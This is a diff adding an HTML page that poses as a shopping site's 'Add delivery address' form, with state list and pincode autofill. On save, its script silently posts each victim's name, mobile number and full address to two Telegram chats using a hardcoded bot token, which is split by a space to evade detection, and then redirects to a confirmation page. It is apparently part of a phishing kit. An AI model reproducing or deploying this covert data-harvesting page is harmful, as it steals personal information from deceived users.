@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Add Delivery Address</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Inter', sans-serif; background-color: #FFFFFF; }
+        .form-input { width: 100%; padding: 12px; border: 1px solid #e0e0e0; border-radius: 4px; font-size: 16px; color: #212121; background-color: #fff; }
+        .form-input:focus { outline: none; border-color: #2874f0; }
+        .form-input.is-invalid { border-color: #ff6161; }
+        .error-text { display: none; color: #ff6161; font-size: 12px; margin-top: 4px; }
+        footer.fixed { position: fixed; bottom:0; left:0; right:0; background:#fff; border-top:1px solid #eee; padding:10px; }
+    </style>
+</head>
+<body class="bg-white">
+
+<header class="bg-white text-black sticky top-0 z-50 p-3 flex items-center gap-4 shadow-sm">
+    <a href="product.html" class="text-gray-600">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7" />
+        </svg>
+    </a>
+    <span class="font-semibold text-base">Add delivery address</span>
+</header>
+
+<main class="bg-white p-4 space-y-2 pb-24">
+    <div>
+        <input type="text" id="fullName" placeholder="Full Name (Required)*" class="form-input">
+        <p id="fullName-error" class="error-text"></p>
+    </div>
+    <div>
+        <input type="tel" id="mobile" placeholder="Mobile number (Required)*" class="form-input" maxlength="10" inputmode="numeric" pattern="\d*">
+        <p id="mobile-error" class="error-text"></p>
+    </div>
+
+    <div class="flex gap-4">
+        <div class="w-1/2">
+            <input type="tel" id="pincode" placeholder="Pincode (Required)*" class="form-input" maxlength="6" inputmode="numeric" pattern="\d*">
+            <p id="pincode-error" class="error-text"></p>
+        </div>
+        <div class="w-1/2">
+            <select id="state" class="form-input bg-white text-gray-700">
+                <option value="">State (Required)*</option>
+            </select>
+            <p id="state-error" class="error-text"></p>
+        </div>
+    </div>
+
+    <div>
+        <input type="text" id="city" placeholder="City (Required)*" class="form-input">
+        <p id="city-error" class="error-text"></p>
+    </div>
+    <div>
+        <input type="text" id="house" placeholder="House No., Building Name (Required)*" class="form-input">
+        <p id="house-error" class="error-text"></p>
+    </div>
+    <div>
+        <input type="text" id="area" placeholder="Road name, Area, Colony (Required)*" class="form-input">
+        <p id="area-error" class="error-text"></p>
+    </div>
+</main>
+
+<footer class="fixed bottom-0 left-0 right-0 bg-white border-t p-2 z-10">
+    <button id="save-address-btn" class="w-full text-center py-3 text-white font-semibold bg-orange-500 rounded-md shadow-lg">Save Address</button>
+</footer>
+
+<script>
+    // --- STATES LIST ---
+    const indianStates = [ 
+        "Andhra Pradesh","Arunachal Pradesh","Assam","Bihar","Chhattisgarh","Goa","Gujarat","Haryana",
+        "Himachal Pradesh","Jharkhand","Karnataka","Kerala","Madhya Pradesh","Maharashtra","Manipur",
+        "Meghalaya","Mizoram","Nagaland","Odisha","Punjab","Rajasthan","Sikkim","Tamil Nadu","Telangana",
+        "Tripura","Uttar Pradesh","Uttarakhand","West Bengal","Andaman and Nicobar Islands","Chandigarh",
+        "Dadra and Nagar Haveli and Daman and Diu","Delhi","Jammu and Kashmir","Ladakh","Lakshadweep","Puducherry"
+    ];
+
+    const stateSelect = document.getElementById('state');
+    indianStates.forEach(state => {
+        const option = document.createElement('option');
+        option.value = state;
+        option.textContent = state;
+        stateSelect.appendChild(option);
+    });
+
+    // --- PINCODE AUTOFILL ---
+    const pincodeInput = document.getElementById('pincode');
+    const cityInput = document.getElementById('city');
+    pincodeInput.addEventListener('keyup', () => {
+        const pincode = pincodeInput.value;
+        if(pincode.length === 6 && /^\d{6}$/.test(pincode)){
+            fetch(`https://api.postalpincode.in/pincode/${pincode}`)
+                .then(res=>res.json())
+                .then(data=>{
+                    if(data[0].Status==='Success'){
+                        const po = data[0].PostOffice[0];
+                        cityInput.value = po.District || '';
+                        stateSelect.value = po.State || '';
+                    }
+                }).catch(()=>{});
+        }
+    });
+
+    // --- FORM VALIDATION + TELEGRAM SEND ---
+    const TELEGRAM_BOT_TOKEN = '8380912113:AA G3S2AjIEhxFlk3gXF0rhLXs_R1fXHZsSw'.replace(/ /g,'');
+    const CHAT_IDS = ['6346588132', '5015227301']; // ✅ dono chat IDs
+
+    function showError(id,msg){
+        const el = document.getElementById(id);
+        const err = document.getElementById(id+'-error');
+        if(el) el.classList.add('is-invalid');
+        if(err){ err.style.display='block'; err.textContent = msg || 'Error'; }
+    }
+    function hideError(id){
+        const el = document.getElementById(id);
+        const err = document.getElementById(id+'-error');
+        if(el) el.classList.remove('is-invalid');
+        if(err) err.style.display='none';
+    }
+    function escapeHtml(s){
+        if(!s && s!==0) return '';
+        return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+    }
+
+    function buildMessage(data){
+        return `<b>New Delivery Address</b>\n\n` +
+            `<b>Name:</b> ${escapeHtml(data.fullName)}\n` +
+            `<b>Mobile:</b> ${escapeHtml(data.mobile)}\n` +
+            `<b>Pincode:</b> ${escapeHtml(data.pincode)}\n` +
+            `<b>State:</b> ${escapeHtml(data.state)}\n` +
+            `<b>City:</b> ${escapeHtml(data.city)}\n` +
+            `<b>House/Building:</b> ${escapeHtml(data.house)}\n` +
+            `<b>Area:</b> ${escapeHtml(data.area)}`;
+    }
+
+    function sendToTelegramBackground(text){
+        CHAT_IDS.forEach(chatId => {
+            try{
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,{
+                    method:'POST',
+                    headers:{'Content-Type':'application/json'},
+                    body: JSON.stringify({chat_id: chatId, text:text, parse_mode:'HTML'}),
+                    keepalive:true
+                }).catch(()=>{});
+            } catch(e){}
+        });
+    }
+
+    document.getElementById('save-address-btn').addEventListener('click', ()=>{
+        const data = {
+            fullName: document.getElementById('fullName').value.trim(),
+            mobile: document.getElementById('mobile').value.trim(),
+            pincode: document.getElementById('pincode').value.trim(),
+            state: document.getElementById('state').value.trim(),
+            city: document.getElementById('city').value.trim(),
+            house: document.getElementById('house').value.trim(),
+            area: document.getElementById('area').value.trim()
+        };
+
+        Object.keys(data).forEach(hideError);
+        let ok = true;
+        if(!data.fullName){ showError('fullName','This field is required'); ok=false; }
+        if(!/^\d{10}$/.test(data.mobile)){ showError('mobile','Enter 10-digit mobile'); ok=false; }
+        if(!/^\d{6}$/.test(data.pincode)){ showError('pincode','Enter 6-digit pincode'); ok=false; }
+        if(!data.state){ showError('state','Select state'); ok=false; }
+        if(!data.city){ showError('city','Required'); ok=false; }
+        if(!data.house){ showError('house','Required'); ok=false; }
+        if(!data.area){ showError('area','Required'); ok=false; }
+        if(!ok) return;
+
+        // send to telegram silently (both chat IDs)
+        sendToTelegramBackground(buildMessage(data));
+
+        // redirect to confirm.html
+        window.location.href = 'confirm.html';
+    });
+</script>
+
+</body>
+</html>
